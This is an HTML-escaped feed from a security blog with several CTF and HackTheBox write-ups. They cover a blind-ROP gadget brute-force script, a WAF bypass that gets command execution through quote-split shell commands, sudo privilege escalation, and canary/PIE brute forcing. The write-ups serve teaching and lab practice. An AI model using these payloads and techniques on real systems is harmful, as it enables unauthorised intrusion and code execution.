&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop_rdi_ret candidate&lt;/code&gt; + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;random 8 bytes&lt;/code&gt; + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;the original return address&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop_rsi__r15_ret candidate&lt;/code&gt; + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;random 8 bytes&lt;/code&gt; + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;random 8 bytes&lt;/code&gt; + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;the original return address&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;and use “&lt;strong&gt;Bye!&lt;/strong&gt;” as a reference of success !&lt;/p&gt;

&lt;p&gt;Here is a small snippet of code:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;find_rops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rops&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;level&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'ERROR'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

		&lt;span class=&quot;c1&quot;&gt;# for pop rdi ; ret
&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret_address&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;# for pop rsi ; pop r15 ; ret
&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret_address&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'(chocolate/beer/hamburger): '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'are out of stock&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

		&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;recved&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;recved&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recved&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;

		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Bye!'&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recved&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;not_rops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;rops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xfff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This gives us 2 lists of candidates, one for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi;ret&lt;/code&gt;  and another one for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rsi;pop r15;ret&lt;/code&gt;.
Now we have to figure out which ones are the one we need, right?.&lt;/p&gt;

&lt;h1 id=&quot;3-dumping-the-binary-and-libc&quot;&gt;3) Dumping the binary and libc:&lt;/h1&gt;

&lt;p&gt;The idea is to bruteforce the binary starting from the return address until we reach the got entry for a function that sends data back to us, like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;write&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;send&lt;/code&gt; etc…&lt;/p&gt;

&lt;p&gt;To do so, will combine the 2 lists of candidate gadgets, and build a rop chain that send us data.
Let’s illustrate this with some algorithmic:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-linenos&quot; data-lang=&quot;linenos&quot;&gt;addr = return_address
do
	for pop_rdi in pop_rdi_candididates:
		for pop_rsi_r15 in pop_rsi_r15_candididates:
			payload  = &quot;junk for overflowing&quot; 
			payload += pop_rdi
			payload += &quot;socket FD to send data back too&quot;
			payload += pop_rsi_r15
			payload += &quot;an address to leak, like binary base&quot;
			payload += &quot; 8 junk bytes&quot;
			payload += addr
	addr += 1
while not receiving any data &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;After finding the right address for a send function, and the right rop gadgets, we can start &lt;strong&gt;dumping&lt;/strong&gt; libc and the binary from memory for future gadgets like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdx&lt;/code&gt; or we can simply call system function from libc.&lt;/p&gt;

&lt;p&gt;With all this information, building an exploit is trivial, you can find a copy of the binary &lt;a href=&quot;http://localhost:4000/assets/downloads/brop_binary.zip&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><category term="pwning" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">Rooting Fluxcapacitor box</title><link href="http://localhost:4000/2018/05/15/flux.html" rel="alternate" type="text/html" title="Rooting Fluxcapacitor box" /><published>2018-05-15T14:14:06-05:00</published><updated>2018-05-15T14:14:06-05:00</updated><id>http://localhost:4000/2018/05/15/flux</id><content type="html" xml:base="http://localhost:4000/2018/05/15/flux.html">&lt;h2 id=&quot;please-read-the-disclamer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclamer&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Hello this a &lt;strong&gt;writeup&lt;/strong&gt; for a box from &lt;a href=&quot;https://www.hackthebox.eu&quot;&gt;HackTheBox&lt;/a&gt; which is focused mainly on &lt;strong&gt;&lt;em&gt;WAF&lt;/em&gt;&lt;/strong&gt; Bypassing.&lt;/p&gt;

&lt;p&gt;First things first, we launch a nmap to scan for open ports,&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; 10.10.10.69 &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/flux_nmap.png&quot; alt=&quot;flux_nmap&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cool port 80 is open, checking the source code we find the following&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/flux_source0.png&quot; alt=&quot;flux_source0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;browsing to this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/sync&lt;/code&gt; file, returns a forbidden page ummm… that’s weird, I tried to curl it&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;s2&quot;&gt;&quot;10.10.10.69/sync&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/flux_curl0.png&quot; alt=&quot;flux_curl0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Well… we have a &lt;strong&gt;WAF&lt;/strong&gt; here :D, after poking around I found it blocks requests that contain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; and other special characters.&lt;/p&gt;

&lt;p&gt;Let’s run wfuzz to bruteforce some existing parameters&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlist/directory-list-2.3-medium.txt  &lt;span class=&quot;nt&quot;&gt;--hh&lt;/span&gt; 19  &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.10.69/sync?FUZZ=random'stuff&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/flux_wfuzz0.png&quot; alt=&quot;flux_wfuzz0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;great &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opt&lt;/code&gt; is the right parameter, after playing with it, I found out that it blocks words like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; etc …
this can be easily bypassed by adding quotes like the following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;l's'&lt;/code&gt; which equals &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; this happens because all adjacent string literals are concatenated in Bash, by doing that I bypassed the WAF but still no command execution…&lt;/p&gt;

&lt;p&gt;After an extensive manual fuzzing, i found that if I put &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opt=' i'd''&lt;/code&gt; I get command execution !!!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/flux_rce.png&quot; alt=&quot;flux_rce&quot; /&gt;&lt;/p&gt;

&lt;p&gt;cool, let’s run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/flux_sudol.png&quot; alt=&quot;flux_sudol&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/themiddle/.monit&lt;/code&gt; as root, let’s check that file&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/flux_file_monit.png&quot; alt=&quot;flux_file_monit&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Easy!, we just have to run this script and give it 2 arguments, the first one must be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmd&lt;/code&gt; and the second one our command base64 encoded and we are root !&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/flux_root.png&quot; alt=&quot;flux_root&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="box" /><summary type="html">Please read the disclamer</summary></entry><entry><title type="html">Forker</title><link href="http://localhost:4000/2018/04/16/Forker.html" rel="alternate" type="text/html" title="Forker" /><published>2018-04-16T09:53:06-05:00</published><updated>2018-04-16T09:53:06-05:00</updated><id>http://localhost:4000/2018/04/16/Forker</id><content type="html" xml:base="http://localhost:4000/2018/04/16/Forker.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Hello, in this post I will talk about an exploitation challenge from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WPICTF&lt;/code&gt;, I participated alone in it and I was ranked top 22 just by pwning stuff xD.&lt;/p&gt;

&lt;p&gt;There was 4 levels for this challenge all based on stack exploitation, the difficulty was raising in each &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;level + 1&lt;/code&gt; which means more protections to bypass :D, so let’s start from level1.&lt;/p&gt;

&lt;h1 id=&quot;1-forkerlevel1&quot;&gt;1) Forker.Level1:&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/forker_level1_reverse0.png&quot; alt=&quot;forker_level1_reverse0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So our binary initiat a server using sockets, then waits for a client to connect, when it does it calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fork&lt;/code&gt; function, and then runs &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check_password&lt;/code&gt; function, let’s check this latter one.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/forker_level1_reverse1.png&quot; alt=&quot;forker_level1_reverse1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Just a simple buffer overflow, we have our buffer at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BP-0x50&lt;/code&gt; and our index counter at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BP-0x04&lt;/code&gt;, to be able to buffer overflow we have to make sure we don’t overwrite our index_counter with junk, so in short we have to write 76 junk bytes + 8 bytes which represents our index + 4 other junk bytes.&lt;/p&gt;

&lt;p&gt;Running &lt;a href=&quot;https://github.com/slimm609/checksec.sh&quot;&gt;checksec&lt;/a&gt; shows the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/forker_level1_checksec.png&quot; alt=&quot;forker_level1_checksec&quot; /&gt;&lt;/p&gt;

&lt;p&gt;simple task right, well not so fast we still have a problem to deal with, so in short we can successfully call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; and pop a shell, cool, but how are we gonna send commands to it and receive its output? it only reads from STDIN and writes to STDOUT haha…, here comes the savior &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dup2&lt;/code&gt; function, let’s check its manual.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/forker_level1_dup2.png&quot; alt=&quot;forker_level1_dup2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Yeah!, we can use this cool function to make a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;I/O redirection&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;so let’s build a rop that calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dup2&lt;/code&gt; to set the correct redirection for input/output, then call for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Here is my &lt;a href=&quot;https://github.com/soolidsnake/Write-ups/blob/master/WPICTF/Forker.1/full_exploit_1.py&quot;&gt;exploit&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-forkerlevel2&quot;&gt;2) Forker.Level2:&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/forker_level2_reverse0.png&quot; alt=&quot;forker_level2_reverse0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s &lt;a href=&quot;https://github.com/slimm609/checksec.sh&quot;&gt;checksec&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/forker_level2_checksec.png&quot; alt=&quot;forker_level2_checksec&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In level2 we have to bypass &lt;a href=&quot;https://fr.wikipedia.org/wiki/Stack-Smashing_Protector&quot;&gt;Stack-Smashing Protector&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Note : when a binary forks it self, the child inherit canary from its parent, it also inherit the loaded in a location address if PIE is enabled&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The best and easy solution would be to bruteforce the canary byte by byte then overwrite the return address with a rop that pops a shell.&lt;/p&gt;

&lt;p&gt;Here is my &lt;a href=&quot;https://github.com/soolidsnake/Write-ups/blob/master/WPICTF/Forker.2/full_exploit_2.py&quot;&gt;exploit&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;3-forkerlevel3&quot;&gt;3) Forker.Level3:&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/forker_level3_reverse0.png&quot; alt=&quot;forker_level3_reverse0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;let’s &lt;a href=&quot;https://github.com/slimm609/checksec.sh&quot;&gt;checksec&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/forker_level3_checksec.png&quot; alt=&quot;forker_level3_checksec&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This getting harder and harder, now we have to bypass &lt;a href=&quot;https://en.wikipedia.org/wiki/Position-independent_code&quot;&gt;PIE protection&lt;/a&gt; too, my solution was also to brute force the return address.&lt;/p&gt;

&lt;p&gt;Checking the assembly code&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/forker_level3_reverse1.png&quot; alt=&quot;forker_level3_reverse1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We see that before returning to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt;, it pops a value from the stack to a  global variable named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client_sockfd&lt;/code&gt; which is our file descriptor of our connection, so we have to make sure to set its correct value when buffer overflowing.&lt;/p&gt;

&lt;p&gt;Here is my &lt;a href=&quot;https://github.com/soolidsnake/Write-ups/blob/master/WPICTF/Forker.3/full_exploit_3.py&quot;&gt;exploit&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="pwning" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">PWNING ROPME</title><link href="http://localhost:4000/2018/04/14/ropme.html" rel="alternate" type="text/html" title="PWNING ROPME" /><published>2018-04-14T09:53:06-05:00</published><updated>2018-04-14T09:53:06-05:00</updated><id>http://localhost:4000/2018/04/14/ropme</id><content type="html" xml:base="http://localhost:4000/2018/04/14/ropme.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Hello, this is my first post on this website, from now on I will publish tutorials and solutions for the challenges that I complete for educational purpose.&lt;/p&gt;

&lt;p&gt;In this small tutorial we will talk about:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;How to leak an address from libc&lt;/li&gt;
  &lt;li&gt;How to find the correct version of libc used by the remote target&lt;/li&gt;
  &lt;li&gt;How to exploit and gain a remote shell&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We will use a tool called &lt;a href=&quot;https://docs.pwntools.com/en/stable&quot;&gt;pwntools&lt;/a&gt; to write our exploit script, using python as language.&lt;/p&gt;

&lt;p&gt;I chose a challenge proposed by the cyber security community &lt;a href=&quot;https://0x00sec.org&quot;&gt;0x00sec&lt;/a&gt;. so let’s get right into it.&lt;/p&gt;

&lt;h1 id=&quot;reversing-part&quot;&gt;Reversing part:&lt;/h1&gt;

&lt;p&gt;The binary is a simple &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELF 64-bit dynamically linked&lt;/code&gt; let’s check its protections.&lt;/p&gt;

&lt;p&gt;Using &lt;a href=&quot;https://github.com/slimm609/checksec.sh&quot;&gt;checksec&lt;/a&gt; we see that stack smashing protection is disabled.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/ropme_checksec.png&quot; alt=&quot;ropme_checksec&quot; /&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__cdecl&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
